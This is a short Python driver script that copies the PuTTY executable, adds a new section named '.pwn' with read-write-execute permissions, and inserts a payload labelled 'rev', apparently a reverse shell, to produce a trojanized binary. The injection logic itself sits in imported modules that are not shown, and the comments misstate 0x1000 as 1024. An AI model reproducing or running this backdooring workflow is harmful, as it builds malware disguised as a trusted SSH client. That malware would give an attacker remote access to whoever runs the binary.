import payload_injection
import section_injection
import utilities

path = utilities.make_duplicate("./assets/bin/putty.exe", 'injection')
file_info = [path,
             ".pwn",
             0x1000,        # Page Size 1024
             0x1000,        # Section Size 1024
             0xE0000000]    # permissions READ WRITE EXECUTE
section_injection.add_section(file_info)

p = 'rev'
path = utilities.make_duplicate("./assets/bin/putty_injection.exe", p)

payload_injection.insert_payload(path, p)
